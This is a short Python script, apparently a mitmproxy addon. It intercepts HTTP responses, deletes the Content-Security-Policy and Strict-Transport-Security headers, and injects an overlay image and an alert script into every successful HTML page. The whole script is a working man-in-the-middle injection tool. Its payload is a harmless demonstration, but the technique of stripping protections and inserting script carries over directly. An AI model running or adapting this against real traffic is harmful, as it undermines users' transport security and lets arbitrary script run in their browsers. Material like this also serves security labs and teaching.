# HTML code for the overlay image
OVERLAY_HTML = b"<img style='z-index:10000;width:100%;height:100%;top:0;left:0;position:fixed;opacity:0.5' src='Your_jpg_URL' />"

# JavaScript code for the overlay alert
OVERLAY_JS = b"<script>alert('You can\'t click anything on this page'); console.log('Overlay JS executed');</script>"

def remove_header(response, header_name):
    """
    Function to remove a specific header from the response.

    Parameters:
    - response: The HTTP response object.
    - header_name: The name of the header to be removed.
    """
    if header_name in response.headers:
        del response.headers[header_name]

def response(flow):
    """
    The main function called for each intercepted HTTP response.

    Parameters:
    - flow: The intercepted flow containing the request and response.
    """

    # Remove security headers in case they're present
    remove_header(flow.response, "Content-Security-Policy")
    remove_header(flow.response, "Strict-Transport-Security")

    # If content-type is not available, ignore
    if "content-type" not in flow.response.headers:
        return

    # If it's HTML & response code is 200 OK, then inject the overlay snippet (HTML & JS)
    if "text/html" in flow.response.headers["content-type"] and flow.response.status_code == 200:
        # Separate HTML and JavaScript modifications
        flow.response.content += OVERLAY_HTML
        flow.response.content += OVERLAY_JS
